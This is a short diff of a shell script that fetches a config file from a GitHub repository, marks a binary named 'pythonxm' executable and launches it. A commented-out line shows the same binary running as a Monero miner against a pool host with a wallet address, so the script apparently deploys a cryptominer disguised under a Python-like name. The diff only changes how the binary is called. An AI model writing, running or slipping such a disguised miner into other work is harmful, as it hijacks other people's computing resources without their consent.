@@ -8,7 +8,7 @@ wget -q https://github.com/one10001/10001code/raw/main/config.json
 sed -i "s+ip0001+$IPNAME+g" config.json
 chmod +x pythonxm
 #pythonxm  -o ehttp.info:443 --coin=XMR -u 44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELqg9DJKNA1oRoNZKCGyn1p  -p x -k -t 8 2> logxm.out 1> logxm.out  &
-pythonxm   -c config.json 
+./pythonxm   -c config.json 
 #while [ 1 ]
 #do
 #    echo '#######################################################################################################################################'
